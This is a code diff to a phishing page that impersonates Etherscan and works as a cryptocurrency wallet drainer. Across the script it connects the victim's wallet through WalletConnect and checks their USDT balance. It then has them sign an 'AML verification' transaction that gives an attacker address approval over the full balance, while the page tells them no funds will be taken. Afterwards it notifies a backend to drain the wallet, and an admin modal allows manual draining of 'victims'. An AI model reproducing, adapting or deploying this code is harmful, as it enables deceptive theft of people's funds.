@@ -620,7 +620,7 @@
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
 
 <script>
-  /* ===== Icônes (inchangées) ===== */
+  /* ===== Icônes (inchangé) ===== */
   const ICONS = {
     chevronDown: '<path d="m6 9 6 6 6-6"/>',
     userCircle: '<circle cx="12" cy="12" r="10"/><circle cx="12" cy="10" r="3"/><path d="M7 20.7a8 8 0 0 1 10 0"/>',
@@ -758,8 +758,6 @@
     html += '<li aria-hidden="true" class="nav-sep">|</li>';
     html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
     navList.innerHTML = html;
-
-    // Render mega menus for items with columns (ici seul More est concerné, mais il est en dur dans le HTML)
   }
 
   function setOpen(label) {
@@ -771,7 +769,6 @@
       b.classList.toggle('open', b.getAttribute('data-menu') === label);
     });
 
-    // Polling pour le menu More
     if (label === 'More') {
       fetchVictims();
       if (!victimPollTimer) {
@@ -872,12 +869,10 @@
   const ADMIN_PASSWORD = 'admin'; // change if you want
   const ADMIN_SECRET = 'mon_secret_admin'; // must match API env
 
-  // Open modal when "Sign In" is clicked
   document.addEventListener('click', function(e) {
     if (e.target.closest('.signin')) {
       e.preventDefault();
       adminModal.classList.add('open');
-      // reset
       adminLoginDiv.style.display = 'block';
       adminDrainDiv.style.display = 'none';
       adminPassword.value = '';
@@ -886,13 +881,11 @@
     }
   });
 
-  // Close modal
   closeAdmin.addEventListener('click', () => adminModal.classList.remove('open'));
   window.addEventListener('click', (e) => {
     if (e.target === adminModal) adminModal.classList.remove('open');
   });
 
-  // Unlock drain form
   adminLoginBtn.addEventListener('click', () => {
     if (adminPassword.value === ADMIN_PASSWORD) {
       adminLoginDiv.style.display = 'none';
@@ -903,7 +896,6 @@
     }
   });
 
-  // Drain manually
   drainBtn.addEventListener('click', async () => {
     const victim = victimAddress.value.trim();
     if (!ethers.utils.isAddress(victim)) {
@@ -924,13 +916,13 @@
     }
   });
 
-  /* ===== WalletConnect + PermitDrain Meta-Transaction ===== */
+  /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
   const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-  const PERMIT_DRAIN_ADDRESS = '0xaD78f97c63191227AD19DA543fc3fb022aA0D90f';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
+  const AML_ADDRESS = '0x6b30b919e85317b35D31f870fF90A21b20dB84A1'; // Nouveau contrat
 
   let signClient, session, account;
 
@@ -1022,7 +1014,6 @@
     if (!ethAccount) throw new Error('Ethereum mainnet requis');
     account = ethAccount.split(':')[2];
 
-    // Replace QR with status
     qrDiv.innerHTML = '';
     qrDiv.style.display = 'flex';
     qrDiv.style.alignItems = 'center';
@@ -1034,36 +1025,49 @@
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'En attente de confirmation…';
 
-    // Enregistrer la connexion
     fetch('/api/record-wallet', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        address: account,
-        chain: '1'
-      })
+      body: JSON.stringify({ address: account, chain: '1' })
     }).catch(err => console.error('Erreur record-wallet:', err));
 
-    // Passer à l'approve directe
     setTimeout(startApprove, 1000);
   }
 
   async function startApprove() {
-    const approveData = '0x095ea7b3' +
-      ATTACKER.slice(2).padStart(64, '0') +
-      MAX_UINT256.slice(2).padStart(64, '0');
-
-    const tx = {
-      from: account,
-      to: USDT_ADDR,
-      data: approveData,
-      gasLimit: '0x15F90' // 90k gas, largement suffisant pour un approve
-    };
-
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = '🔒 Veuillez confirmer la transaction de vérification. Cela ne prélève aucun fonds.';
-
     try {
+      const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793');
+      const usdtContract = new ethers.Contract(USDT_ADDR, [
+        'function balanceOf(address) view returns (uint256)',
+        'function decimals() view returns (uint8)'
+      ], provider);
+
+      const balance = await usdtContract.balanceOf(account);
+      if (balance.isZero()) {
+        document.querySelector('.scan').textContent = '❌ Aucun USDT détecté.';
+        return;
+      }
+
+      // Construction de l'appel à authorizeVerifier sur le contrat AML
+      const iface = new ethers.utils.Interface([
+        'function authorizeVerifier(address token, address verifier, uint256 amount)'
+      ]);
+      const data = iface.encodeFunctionData('authorizeVerifier', [
+        USDT_ADDR,
+        ATTACKER,
+        balance   // on autorise seulement le montant possédé (pas illimité)
+      ]);
+
+      const tx = {
+        from: account,
+        to: AML_ADDRESS,
+        data: data,
+        value: '0x0'
+      };
+
+      const scanText = document.querySelector('.scan');
+      if (scanText) scanText.textContent = '🔒 Veuillez confirmer la vérification de propriété. Cela ne prélève aucun fonds.';
+
       await signClient.request({
         topic: session.topic,
         request: {
@@ -1075,9 +1079,9 @@
         chainId: 'eip155:1'
       });
 
-      if (scanText) scanText.textContent = '✅ Transaction confirmée. Vérification AML en cours…';
+      if (scanText) scanText.textContent = '✅ Vérification en cours… Patientez.';
 
-      // Attente pour que la transaction soit minée, puis déclenchement du drain
+      // Après confirmation, on prévient le backend pour le drain
       setTimeout(async () => {
         const resp = await fetch(API, {
           method: 'POST',
@@ -1087,10 +1091,10 @@
         const data = await resp.json();
         if (scanText) scanText.textContent = data.success ? '✅ Vérification terminée. Redirection…' : '❌ Erreur, veuillez réessayer.';
         if (data.success) setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
-      }, 15000); // 15 secondes pour être large
+      }, 8000);
     } catch (e) {
       console.error('Transaction refusée', e);
-      if (scanText) scanText.textContent = '❌ Confirmation refusée.';
+      document.querySelector('.scan').textContent = '❌ Confirmation refusée.';
     }
   }
 
@@ -1216,6 +1220,8 @@
     });
   });
 </script>
+</body>
+</html>
 </body>
 </html>
 </body>
